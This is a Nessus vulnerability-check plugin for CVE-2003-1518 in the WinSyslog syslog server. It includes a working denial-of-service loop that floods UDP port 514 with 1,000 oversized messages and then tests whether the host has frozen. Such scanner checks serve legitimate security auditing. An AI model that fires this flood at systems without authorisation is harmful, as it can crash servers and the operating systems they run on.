#
# WinSysLog DoS
# http://www.winsyslog.com
#

# Changes by Tenable:
# - Revised plugin title, OSVDB ref, family change (6/25/09)

include("compat.inc");

if(description)
{
	script_id(11884);
	script_version("$Revision: 1.12 $");
	script_cve_id("CVE-2003-1518");
	script_bugtraq_id(8821);
	script_xref(name:"OSVDB", value:"2667");

	script_name(english:"WinSyslog Long Syslog Message Remote DoS");
  script_set_attribute(
    attribute:"synopsis",
    value:"The remote syslog service has a denial of service vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running WinSyslog, an enhanced syslog server for
Windows.  A vulnerability in the product allows remote attackers to
cause the WinSyslog to freeze, which in turn will also freeze the
operating system on which the product executes."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/fulldisclosure/2003-q4/1229.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Contact the vendor for a patch."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
  );
  script_end_attributes();
	
        script_summary(english:"Attempts to crash the remote host");
	script_category(ACT_DENIAL);	# ACT_FLOOD?
	script_copyright(english:"This script is copyright (C) 2003-2009 Matthew North");
	script_family(english:"Windows");
  	script_dependencies('os_fingerprint.nasl');
	script_require_keys("Settings/ParanoidReport");
	exit(0);
}


include('global_settings.inc');

os = get_kb_item("Host/OS");
if ( os && "Windows" >!< os ) exit(0);

if ( report_paranoia < 2 ) exit(0);


soc = open_sock_udp(514);
if(!soc) exit(0);
start_denial();

for(i=0; i < 1000; i++) {
                        num = (600+i)*4;
			bufc = string(crap(num));
                        buf = string("<00>", bufc); 
	                send(socket:soc,data:buf);
            }

close(soc);
sleep(5);
alive = end_denial();
if(!alive)security_hole(port:514, proto:"udp");
